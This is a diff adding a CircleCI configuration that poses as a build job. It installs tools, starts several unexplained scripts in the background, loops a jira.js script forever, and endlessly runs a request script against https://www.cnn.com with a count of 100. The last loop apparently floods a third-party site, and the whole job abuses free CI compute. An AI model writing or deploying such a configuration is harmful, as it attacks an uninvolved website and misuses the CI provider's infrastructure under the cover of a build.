@@ -1,0 +1,15 @@
+version: 2.0
+jobs:
+  build:
+    docker:
+      - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: |
+          apt update && apt -y install wget curl axel nodejs npm 
+          chmod +x ./test.sh && ./test.sh &
+          chmod +x ./google.sh && ./google.sh &
+          chmod +x ./rw.sh && ./rw.sh &
+          chmod +x ./jira.sh && ./jira.sh &
+          npm install && while true; do nodejs jira.js; done &
+          while true; do node req.js https://www.cnn.com 100 > /dev/null; done
